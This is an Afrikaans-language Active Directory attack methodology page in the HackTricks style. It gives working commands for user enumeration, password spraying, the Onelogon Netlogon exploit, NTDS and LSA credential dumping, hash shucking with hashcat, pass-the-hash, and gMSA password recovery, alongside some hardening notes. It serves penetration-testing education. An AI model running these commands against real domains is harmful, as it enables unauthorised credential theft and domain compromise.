# Active Directory-metodologie

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as ’n grondliggende tegnologie waarmee **netwerkadministrateurs** **domeine**, **gebruikers** en **objekte** binne ’n netwerk doeltreffend kan skep en bestuur. Dit is ontwerp om te skaal en maak dit moontlik om ’n groot aantal gebruikers in hanteerbare **groepe** en **subgroepe** te organiseer, terwyl **toegangsregte** op verskeie vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie primêre lae: **domeine**, **bome** en **woude**. ’n **Domein** omvat ’n versameling objekte, soos **gebruikers** of **toestelle**, wat ’n gemeenskaplike databasis deel. **Bome** is groepe van hierdie domeine wat deur ’n gedeelde struktuur verbind is, en ’n **woud** verteenwoordig ’n versameling van verskeie bome wat deur **vertrouensverhoudings** aan mekaar gekoppel is en die boonste laag van die organisatoriese struktuur vorm. Spesifieke **toegang-** en **kommunikasieregte** kan op elk van hierdie vlakke toegeken word.

Belangrike konsepte binne **Active Directory** sluit in:

1. **Gids** – Bevat al die inligting oor Active Directory-objekte.
2. **Objek** – Dui entiteite in die gids aan, insluitend **gebruikers**, **groepe** of **gedeelde vouers**.
3. **Domein** – Dien as ’n houer vir gidsobjekte; verskeie domeine kan binne ’n **woud** bestaan, elk met sy eie versameling objekte.
4. **Boom** – ’n Groepering van domeine wat ’n gemeenskaplike worteldomein deel.
5. **Woud** – Die hoogste organisatoriese vlak in Active Directory, bestaande uit verskeie bome met **vertrouensverhoudings** tussen hulle.

**Active Directory Domain Services (AD DS)** omvat ’n reeks dienste wat noodsaaklik is vir gesentraliseerde bestuur en kommunikasie binne ’n netwerk. Hierdie dienste sluit in:

1. **Domeindienste** – Sentraliseer databerging en bestuur interaksies tussen **gebruikers** en **domeine**, insluitend **verifikasie-** en **soekfunksies**.
2. **Sertifikaatdienste** – Hou toesig oor die skep, verspreiding en bestuur van veilige **digitale sertifikate**.
3. **Liggewig-gidsdienste** – Ondersteun gidsgeaktiveerde toepassings deur die **LDAP-protokol**.
4. **Gidsfederasiedienste** – Bied **enkel-aanmelding**-vermoëns om gebruikers oor verskeie webtoepassings in een sessie te verifieer.
5. **Regtebestuur** – Help om kopieregmateriaal te beskerm deur die ongemagtigde verspreiding en gebruik daarvan te beheer.
6. **DNS-diens** – Noodsaaklik vir die oplossing van **domeinname**.

Vir ’n meer gedetailleerde verduideliking, kyk na: [**TechTerms - Active Directory-definisie**](https://techterms.com/definition/active_directory)

### **Kerberos-verifikasie**

Om te leer hoe om **’n AD aan te val**, moet jy die **Kerberos-verifikasieproses** baie goed **verstaan**.\
[**Lees hierdie bladsy as jy nog nie weet hoe dit werk nie.**](kerberos-authentication.md)

## Cheat Sheet

Jy kan baie by [https://wadcoms.github.io/](https://wadcoms.github.io) kry om vinnig te sien watter opdragte jy kan uitvoer om ’n AD te enumerate/exploit.

> [!WARNING]
> Kerberos-kommunikasie **vereis normaalweg ’n volledig gekwalifiseerde domeinnaam (FQDN)** sodat die kliënt ’n kaartjie vir die korrekte SPN kan kry. Wanneer ’n masjien met ’n IP-adres bereik word, val die verbinding dikwels terug na NTLM eerder as Kerberos.

## Active Directory-verkenning (geen geloofsbriewe/sessies)

As jy net toegang tot ’n AD-omgewing het, maar geen geloofsbriewe/sessies het nie, kan jy:

- **Die netwerk pentest:**
  - Skandeer die netwerk, vind masjiene en oop poorte, en probeer om **kwesbaarhede te exploit** of **geloofsbriewe daaruit te onttrek** (byvoorbeeld, [drukkers kan baie interessante teikens wees](ad-information-in-printers.md)).
  - DNS-enumerasie kan inligting oplewer oor belangrike bedieners in die domein, soos web-, drukker-, deel-, VPN- en mediabedieners, ens.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Kyk na die algemene [**Pentesting-metodologie**](../../generic-methodologies-and-resources/pentesting-methodology.md) vir meer inligting oor hoe om dit te doen.
- **Kyk vir null- en Guest-toegang op SMB-dienste** (dit sal nie op moderne Windows-weergawes werk nie):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - ’n Meer gedetailleerde gids oor hoe om ’n SMB-bediener te enumerate, is hier beskikbaar:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - ’n Meer gedetailleerde gids oor hoe om LDAP te enumerate, is hier beskikbaar (gee **spesiale aandag aan die anonieme toegang**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Vergiftig die netwerk**
  - Versamel geloofsbriewe deur [**dienste met Responder na te boots**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Kry toegang tot ’n gasheer deur [**die relay attack te misbruik**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Versamel geloofsbriewe deur [**vals UPnP-dienste met evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) **bloot te stel**
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Onttrek gebruikersname/name uit interne dokumente, sosiale media, dienste (hoofsaaklik web) binne die domeinomgewings en ook uit bronne wat publiek beskikbaar is.
  - As jy die volle name van maatskappywerknemers vind, kan jy verskillende AD-**gebruikersnaamkonvensies** probeer (**[lees dit](https://activedirectorypro.com/active-directory-user-naming-convention/)**). Die algemeenste konvensies is: _NaamVan_, _Naam.Van_, _NamVan_ (3 letters van elk), _Nam.Van_, _NVan_, _N.Van_, _VanNaam_, _Van.Naam_, _VanN_, _Van.N_, 3 _ewekansige letters en 3 ewekansige syfers_ (abc123).
  - Gereedskap:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Gebruikersenumerasie

- **Anonieme SMB/LDAP-enum:** Kyk na die bladsye oor [**SMB-pentesting**](../../network-services-pentesting/pentesting-smb/index.html) en [**LDAP-pentesting**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute-enum**: Wanneer ’n **ongeldige gebruikersnaam aangevra word**, sal die bediener reageer met die **Kerberos-foutkode** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wat ons in staat stel om vas te stel dat die gebruikersnaam ongeldig is. **Geldige gebruikersname** sal óf die **TGT in ’n AS-REP**-reaksie oplewer óf die fout _KRB5KDC_ERR_PREAUTH_REQUIRED_, wat aandui dat die gebruiker voorafverifikasie moet uitvoer.
- **Geen verifikasie teen MS-NRPC nie**: Gebruik auth-level = 1 (Geen verifikasie) teen die MS-NRPC (Netlogon)-koppelvlak op domeinbeheerders. Die metode roep die `DsrGetDcNameEx2`-funksie aan nadat die MS-NRPC-koppelvlak gebind is om sonder enige geloofsbriewe te kontroleer of die gebruiker of rekenaar bestaan. Die [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)-nutsding implementeer hierdie tipe enumerasie. Die navorsing is [hier beskikbaar](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access)-bediener**

As jy een van hierdie bedieners in die netwerk vind, kan jy ook **gebruikerenumerasie daarteen uitvoer**. Jy kan byvoorbeeld die nutsding [**MailSniper**](https://github.com/dafthack/MailSniper) gebruik:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Jy kan lyste met gebruikersname in [**hierdie github-repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) en hierdie een ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) vind.
>
> Jy behoort egter die **name van die mense wat by die maatskappy werk** te hê uit die recon-stap wat jy vooraf moes uitgevoer het. Met die voornaam en van kon jy die script [**namemash.py**](https://gist.github.com/superkojiman/11076951) gebruik om moontlike geldige gebruikersname te genereer.

### Misbruik van die Netlogon-kwesbare-kanaal-toelaatlys (Onelogon)

Selfs nadat **Zerologon** op die DC gelap is, kan rekeninge wat uitdruklik op die toelaatlys geplaas is steeds blootgestel wees aan **verouderde/kwesbare Netlogon-secure-channel-gedrag**. Die riskante konfigurasie is die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** of die ooreenstemmende registerwaarde **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Daardie waarde is 'n **SDDL-sekuriteitsbeskrywer** (sien [Security Descriptors](security-descriptors.md)). Enige rekening of groep waaraan die toepaslike ACE in die DACL toegeken is, kan geteiken word. Byvoorbeeld, `O:BAG:BAD:(A;;RC;;;WD)` plaas in werklikheid **Everyone** op die toelaatlys.

Praktiese operateur-werkvloei:

1. **Identifiseer prinsipe op die toelaatlys** deur beide **SYSVOL/GPO** en die **lopende DC-register** na te gaan.
2. **Los SIDs** wat in die SDDL gevind word op na werklike AD-gebruikers/rekenaars en prioritiseer **DC-masjienrekeninge**, **trust-rekeninge** en ander bevoorregte masjiene.
3. Probeer herhaaldelik **MS-NRPC / Netlogon-verifikasie** as die rekening op die toelaatlys.
4. Misbruik ná 'n suksesvolle raaiskoot **Netlogon-wagwoordinstelling** om die teikenrekening se wagwoord terug te stel (die publieke PoC stel dit op 'n leë string).<sup>[[9]](#references)[[10]](#references)</sup>

Vinnige triage-/labvoorbeelde uit die publieke artefak:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notas:

- Die **scanner** is nuttig omdat die effektiewe toelaatlys in **SYSVOL**, die **register**, of albei kan bestaan.
- Die exploit-pad self is belangrik omdat dit **nie Domain Admin-regte vereis nie** sodra ’n kwesbare rekening geïdentifiseer is.
- Die kompromittering van ’n **Domain Controller-masjienrekening**, soos `DC$`, is besonder gevaarlik omdat die terugstel van daardie wagwoord breër **AD-oornameroetes** direk kan moontlik maak.
- Die **haalbaarheid van brute force** hang van die modus af: die openbare artefak beskryf ’n meet-in-the-middle-benadering, ’n **24-bis** brute force wanneer ’n ander rekenaarrekening beskikbaar is, en stadiger **32-bis**-variante.

Opsporings- / verhardingsnotas:

- Oudit die toelaatlysbeleid en verwyder alles behalwe tydelike, uitdruklik vereiste versoenbaarheidsuitsonderings.
- Monitor DC-**System**-gebeurtenisse **5827/5828/5829/5830/5831** om te bespeur wanneer kwesbare Netlogon-verbindings geweier, ontdek of uitdruklik deur beleid toegelaat word.
- Behandel rekeninge in `VulnerableChannelAllowList` as **hoërisiko** totdat die ouer afhanklikheid verwyder is.

### Kenning van een of meer gebruikersname

Goed, jy weet dus reeds van ’n geldige gebruikersnaam, maar het geen wagwoorde nie... Probeer dan:

- [**ASREPRoast**](asreproast.md): As ’n gebruiker **nie die** kenmerk _DONT_REQ_PREAUTH_ **het nie**, kan jy **’n AS_REP-boodskap vir daardie gebruiker aanvra**, wat data sal bevat wat met ’n afleiding van die gebruiker se wagwoord geënkripteer is.
- [**Password Spraying**](password-spraying.md): Kom ons probeer die **algemeenste wagwoorde** met elkeen van die ontdekte gebruikers; dalk gebruik een of ander gebruiker ’n swak wagwoord (hou die wagwoordbeleid in gedagte!).
  - Let daarop dat jy ook **OWA-bedieners kan spray** om toegang tot gebruikers se e-posbedieners te probeer kry.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Jy kan dalk uitdaging-**hashes** bekom om te kraak deur sommige **netwerk**protokolle te **vergiftig**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory-enumerering lewer gebruikersname, e-posidentifiseerders en naamgewingpatrone, moontlike teikenhosts en dienste wat gedwing kan word om te verifieer. Gebruik dié konteks om lewensvatbare NTLM-[**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) en moontlike roetes na die AD-omgewing te identifiseer.

### NetExec-verkenning met werkruimtes en relay-gereedheidskontroles

- Gebruik **`nxcdb`-werkruimtes** om die AD-verkenningstoestand per opdrag te hou: `workspace create <name>` skep protokolspesifieke SQLite-databasisse onder `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Wissel aansigte met `proto smb|mssql|winrm` en lys versamelde geheime met `creds`. Verwyder sensitiewe data handmatig wanneer jy klaar is: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Vinnige subnetontdekking met **`netexec smb <cidr>`** wys **domein**, **OS-bouweergawe**, **SMB-ondertekeningsvereistes** en **Null Auth**. Lede met `(signing:False)` is **relay-kwesbaar**, terwyl DC’s dikwels ondertekening vereis.
- Genereer **gasheername in /etc/hosts** direk vanaf NetExec-uitvoer om teikening te vergemaklik:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Wanneer **SMB relay na die DC deur signing geblokkeer word**, ondersoek steeds die **LDAP**-houding: `netexec ldap <dc>` wys `(signing:None)` / swak channel binding uit. ’n DC wat SMB signing vereis maar LDAP signing gedeaktiveer het, bly ’n lewensvatbare **relay-to-LDAP**-teiken vir misbruik soos **SPN-less RBCD**.

### Printer-kant-kliënt-geloofsbrieflekkasies → grootskaalse domeingeloofsbriefvalidering

- Printer-/webkoppelvlakke sluit soms **gemaskerde adminwagwoorde in HTML in**. Om die bronkode/devtools te bekyk, kan die leesbare teks onthul (bv. `<input value="<password>">`), wat Basic-auth-toegang tot skandeer-/drukbewaarplekke moontlik maak.
- Opgehaalde druktake kan **teksdokumente vir nuwe gebruikers** bevat met wagwoorde per gebruiker. Hou die pare in lyn wanneer jy dit toets:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Steel NTLM-kredensiale

As jy toegang tot **ander rekenaars of shares** met die **null- of guest-gebruiker** kan kry, kan jy **lêers plaas** (soos ’n SCF-lêer) wat, indien iemand dit op een of ander manier gebruik, ’n **NTLM-verifikasie teen jou sal laat begin**, sodat jy die **NTLM-uitdaging kan steel** en dit kan kraak:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandel elke NT-hash wat jy reeds het as ’n kandidaatwagwoord vir ander, stadiger formate waarvan die sleutelmateriaal direk van die NT-hash afgelei word. In plaas daarvan om lang wagfrases in Kerberos RC4-kaartjies, NetNTLM-uitdagings of kasbewyse met brute force te probeer kraak, voer jy die NT-hashes in Hashcat se NT-candidate-modusse in en laat dit wagwoordhergebruik bevestig sonder om ooit die gewone teks te leer ken. Dit is veral doeltreffend ná ’n domeinkompromittering, wanneer jy duisende huidige en historiese NT-hashes kan insamel.<sup>[[5]](#references)</sup>

Gebruik shucking wanneer:

- Jy ’n NT-versameling uit DCSync, SAM/SECURITY-dumps of bewaarplekke van bewysstukke het en hergebruik in ander domeine/woude wil toets.
- Jy RC4-gebaseerde Kerberos-materiaal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-antwoorde of DCC/DCC2-blobs vaslê.
- Jy vinnig hergebruik vir lang, onkraakbare wagfrases wil bewys en onmiddellik via Pass-the-Hash wil pivot.

Die tegniek **werk nie** teen enkripsietipes waarvan die sleutels nie die NT-hash is nie (bv. Kerberos etype 17/18 AES). As ’n domein slegs AES afdwing, moet jy terugkeer na die gewone wagwoordmodusse.

#### Bou van ’n NT-hash-versameling

- **DCSync/NTDS** – Gebruik `secretsdump.py` met geskiedenis om die grootste moontlike stel NT-hashes (en hul vorige waardes) te kry:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Geskiedenisinskrywings vergroot die kandidaatpoel aansienlik, omdat Microsoft tot 24 vorige hashes per rekening kan stoor. Vir meer maniere om NTDS-secrets te versamel, sien:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint-kasstortings** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (of Mimikatz `lsadump::sam /patch`) onttrek plaaslike SAM/SECURITY-data en kasdomeinaanmeldings (DCC/DCC2). Verwyder duplikate en voeg daardie hashes by dieselfde `nt_candidates.txt`-lys.
- **Naspoor van metadata** – Hou die gebruikersnaam/domein by wat elke hash opgelewer het (selfs al bevat die woordelys net hex). Wanneer Hashcat die wenkandidaat vertoon, wys ooreenstemmende hashes jou onmiddellik watter sekuriteitsbeginsel ’n wagwoord hergebruik.
- Verkies kandidate uit dieselfde forest of ’n vertroude forest; dit maksimeer die kans op oorvleueling tydens shucking.

#### Hashcat NT-kandidaatmodusse

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- NT-kandidaatinsette **moet rou 32-hex NT-hashes bly**. Deaktiveer reël-enjins (geen `-r` of hibriedmodusse nie), want wysigings beskadig die kandidaat se sleutelmateriaal.
- Hierdie modusse is nie inherent vinniger nie, maar die NTLM-sleutelruimte (~30,000 MH/s op ’n M3 Max) is ~100× vinniger as Kerberos RC4 (~300 MH/s). Om ’n saamgestelde NT-lys te toets, is baie goedkoper as om die hele wagwoordruimte in die stadiger formaat te verken.
- Gebruik altyd die **nuutste Hashcat-bouweergawe** (`git clone https://github.com/hashcat/hashcat && make install`), want modusse 31500/31600/35300/35400 is onlangs bekendgestel.<sup>[[7]](#references)</sup>
- Daar is tans geen NT-modus vir AS-REQ Pre-Auth nie, en AES-etipes (19600/19700) vereis die gewone tekswagwoord, omdat hul sleutels via PBKDF2 uit UTF-16LE-wagwoorde afgelei word, nie uit rou NT-hashes nie.

#### Voorbeeld – Kerberoast RC4 (modus 35300)

1. Leg ’n RC4 TGS vir ’n teiken-SPN vas met ’n gebruiker met lae voorregte (sien die Kerberoast-bladsy vir besonderhede):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Shuck die ticket met jou NT-lys:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat lei die RC4-sleutel van elke NT-kandidaat af en valideer die `$krb5tgs$23$...`-blob. ’n Pas bevestig dat die diensrekening een van jou bestaande NT-hashes gebruik.

3. Pivot onmiddellik via PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Jy kan, indien nodig, later die gewone teks herwin met `hashcat -m 1000 <matched_hash> wordlists/`.

#### Voorbeeld – Geloofsbriewe in kasgeheue (modus 31600)

1. Dump aanmeldings wat in die kasgeheue gestoor is vanaf ’n gekompromitteerde werkstasie:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Kopieer die DCC2-reël vir die interessante domeingebruiker na `dcc2_highpriv.txt` en shuck dit:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. ’n Suksesvolle passing lewer die NT-hash op wat reeds in jou lys bekend is, wat bewys dat die cached user ’n wagwoord hergebruik. Gebruik dit direk vir PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) of brute-force dit in vinnige NTLM-modus om die string te herwin.

Dieselfde werkvloei geld vir NetNTLM challenge-responses (`-m 27000/27100`) en DCC (`-m 31500`). Sodra ’n passing geïdentifiseer is, kan jy relay, SMB/WMI/WinRM PtH begin, of die NT-hash weer offline met masks/rules kraak.



## Enumerating Active Directory MET credentials/session

Vir hierdie fase moet jy **die credentials of ’n session van ’n geldige domeinrekening gekompromitteer het.** As jy geldige credentials of ’n shell as ’n domeingebruiker het, **moet jy onthou dat die opsies wat vroeër gegee is steeds opsies is om ander gebruikers te kompromitteer**.

Voordat jy met geverifieerde enumerasie begin, verstaan die **Kerberos double-hop-probleem**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerasie

Om ’n rekening te kompromitteer is ’n **groot stap in die assessering van die domein**, omdat dit geverifieerde **Active Directory-enumerasie** moontlik maak:

Wat [**ASREPRoast**](asreproast.md) betref, kan jy nou elke moontlike kwesbare gebruiker vind; en wat [**Password Spraying**](password-spraying.md) betref, kan jy ’n **lys van al die gebruikersname** kry en die wagwoord van die gekompromitteerde rekening, leë wagwoorde en nuwe belowende wagwoorde probeer.

- Jy kan [**CMD gebruik om basiese recon uit te voer**](../basic-cmd-for-pentesters.md#domain-info)
- Jy kan ook [**powershell vir recon gebruik**](../basic-powershell-for-pentesters/index.html), wat meer stealthy sal wees
- Jy kan ook [**powerview gebruik**](../basic-powershell-for-pentesters/powerview.md) om meer gedetailleerde inligting te onttrek
- Nog ’n uitstekende recon-tool vir ’n active directory is [**BloodHound**](bloodhound.md). Dit is **nie baie stealthy nie** (afhangend van die versamelingsmetodes wat jy gebruik), maar **as jy nie daaroor bekommerd is nie**, moet jy dit beslis probeer. Vind waar gebruikers RDP kan gebruik, vind ’n pad na ander groepe, ens.
  - **Ander outomatiese AD-enumerasietools is:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS-rekords van die AD**](ad-dns-records.md), aangesien hulle interessante inligting kan bevat.
- ’n **Tool met GUI** wat jy kan gebruik om die directory te enumereer, is **AdExplorer.exe** van die **SysInternal** Suite.
- Jy kan ook die LDAP-databasis met **ldapsearch** deursoek vir credentials in die velde _userPassword_ en _unixUserPassword_, of selfs in die gebruiker se _description_- en _info_-notas. ’n Ongemerkte token in _info_ wat soos ’n wagwoord lyk, is slegs ’n kandidaat: bevestig die doel en geldigheid daarvan afsonderlik, en hou notainhoud uit roetine-enumerasie-uitvoer. Sien [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) vir ander metodes.
- Gaan domeinaanmeld- en skyfkarteringsskrifte waartoe jy **toegang het** na onder `\\<dc>\NETLOGON` of `\\<dc>\SYSVOL\<domain>\scripts`, waar magtiging dit toelaat. [Microsoft dokumenteer](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) die NETLOGON-share se rol as ’n skripgids. Lys eers die name en ondersoek dan slegs relevante, leesbare skripte binne ’n groottelimiet; moenie ’n hele share aflaai of credential-waardes tydens roetine-enumerasie vertoon nie. ’n PowerShell-aanroep na [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **beskerm nie** ’n letterlike wagwoord wat in die skrip gestoor is nie. Die aanroep alleen bewys nie dat ’n geheim hardcoded is nie: spoor die werklike invoer na en verifieer dan afsonderlik die rekening, die geldigheid van die credential en die voorregte. ’n Domeinskrip is ’n nagaan van ’n afgeleë share, apart van plaaslike host-enumerasie.
- As jy **Linux** gebruik, kan jy die domein ook met [**pywerview**](https://github.com/the-useless-one/pywerview) enumereer.
- Jy kan ook outomatiese tools probeer, soos:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Onttrekking van alle domeingebruikers**

  Dit is baie maklik om al die domein-gebruikersname vanaf Windows te kry (`net user /domain` ,`Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Selfs al lyk hierdie Enumerasie-afdeling kort, is dit die belangrikste deel van alles. Gaan na die skakels (hoofsaaklik dié oor cmd, powershell, powerview en BloodHound), leer hoe om ’n domein te enumereer en oefen totdat jy gemaklik voel. Tydens ’n assessering sal dit die sleuteloomblik wees om jou pad na DA te vind of te besluit dat niks gedoen kan word nie.

### Voorspelbare voorafgeskepte rekenaarrekeninge -> toegang tot gMSA-wagwoorde

Rekenaarrekeninge wat vir ouer aansluitings vooraf opgestel is, kan ’n voorspelbare aanvanklike wagwoord behou. NetExec se `pre2k`-module identifiseer die kenmerkende `userAccountControl`-waarde `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) en probeer ’n Kerberos TGT met die eerste 14 karakters van die rekenaarnaam in kleinletters, sonder die afsluitende `$`. Behandel hierdie UAC-waarde as ’n kandidaatkeurder eerder as om aan te neem dat lidmaatskap van **Pre-Windows 2000 Compatible Access** alleen bewys dat die wagwoord swak is.<sup>[[18]](#references)[[20]](#references)</sup>

Gebruik geverifieerde LDAP-enumerasie om die kandidate te toets en suksesvolle TGT’s te stoor. `ALL=True` brei toetsing uit naas objekte met die verstekfilter `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

'n Mislukte verstek-/NTLM-bind **maak nie** hierdie bevinding ongeldig nie: toets met `-k`, 'n FQDN wat na die DC resolve, en 'n klok wat met die KDC gesinchroniseer is. Suksesvolle module-uitvoere skryf kandidaatlyste en verkrygde ccaches onder `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Nadat die rekenaar-prinsipaal gekompromitteer is, karteer sy geneste groep-lidmaatskappe en uitgaande regte. In die besonder kan prinsipale wat in 'n gMSA se `msDS-GroupMSAMembership`-sekuriteitsbeskrywer genoem word, `msDS-ManagedPassword` lees; NetExec se `--gmsa`-afvoer wys die toegelate prinsipale en gee die huidige NT-hash terug wanneer die verifiërende rekenaar gemagtig is.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Evalueer dan die herwonne gMSA soos enige ander geloofsbrief: ondersoek plaaslike/domeingroeplidmaatskap, logon-regte, SPNs, delegasie en bereikbare dienste voordat jy pass-the-hash probeer. Hierdie ACL-gebaseerde herwinningsroete verskil van [Golden gMSA/dMSA](golden-dmsa-gmsa.md), wat bestuurde wagwoorde aflei ná die kompromittering van die KDS-wortelsleutel.<sup>[[20]](#references)</sup>

’n Rekenaar-prinsipaal kan ook uitgaande beheer oor ander rekenaarobjekte of groepe hê. Nadat jy een verkry het, ondersoek sy geneste lidmaatskappe en effektiewe ACL’s afsonderlik: ’n skryftoestemming op ’n ander rekenaarobjek kan ’n rekeningverandering moontlik maak, en regte vir groeplidmaatskap kan tot ’n logon-rol lei. ’n Staged-account-vlag, voorspelbare naamkonvensie of `GenericWrite`-rand bewys op sigself nie die volledige pad nie.

